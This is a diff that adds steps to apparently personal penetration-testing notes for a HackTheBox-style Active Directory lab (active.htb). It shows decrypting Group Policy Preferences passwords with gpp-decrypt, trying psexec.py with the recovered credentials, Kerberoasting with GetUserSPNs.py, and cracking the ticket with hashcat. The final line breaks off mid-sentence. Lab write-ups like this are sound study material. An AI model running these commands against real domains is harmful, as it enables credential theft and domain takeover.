@@ -300,6 +300,16 @@
 #### Decrypting GPP in Kali
 
 * `gpp-decrypt <cPassword from Group Policy xml file>`
+* result in example: password
+* we can now abuse GPP using ***psexec.py*** and the ***password***
+
+#### Abusing GPP
+
+* `psexec.py active.htb/svc_tgs:password@<target IP>`
+* it is possible to get valid user credentials but ***not writable*** in this case we can do ***kerberoasting***
+* `GetUserSPNs.py active.htb/svc_tgs:password -dc-ip <taget IP> -request` and we get the service ticket, copy and save this ticket into a file
+* pass it into hashcat and: `hashcat -m 13100 hashes.txt rockyou.txt -O`
+* because this service account is also an administrator account 
 
 #### For Practice
 
